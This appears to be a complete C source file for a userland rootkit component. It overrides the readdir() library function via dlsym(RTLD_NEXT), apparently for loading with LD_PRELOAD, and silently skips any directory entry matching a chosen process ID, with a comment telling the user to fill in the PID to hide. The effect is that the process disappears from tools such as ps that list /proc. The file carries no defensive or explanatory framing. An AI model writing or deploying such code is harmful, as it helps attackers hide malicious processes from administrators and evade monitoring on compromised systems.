#define _GNU_SOURCE
#include <stdio.h>
#include <dirent.h>
#include <string.h>
#include <stdlib.h>
#include <dlfcn.h>

static const char *hide_pid = "5432"; // <--- Replace this with the actual PID you want to hide

struct dirent *(*original_readdir)(DIR *dirp);

struct dirent *readdir(DIR *dirp) {
    if (!original_readdir) {
        original_readdir = dlsym(RTLD_NEXT, "readdir");
    }

    struct dirent *dir;
    while ((dir = original_readdir(dirp)) != NULL) {
        if (strcmp(dir->d_name, hide_pid) == 0) {
            continue;  // Skip showing the hidden PID
        }
        return dir;
    }
    return NULL;
}
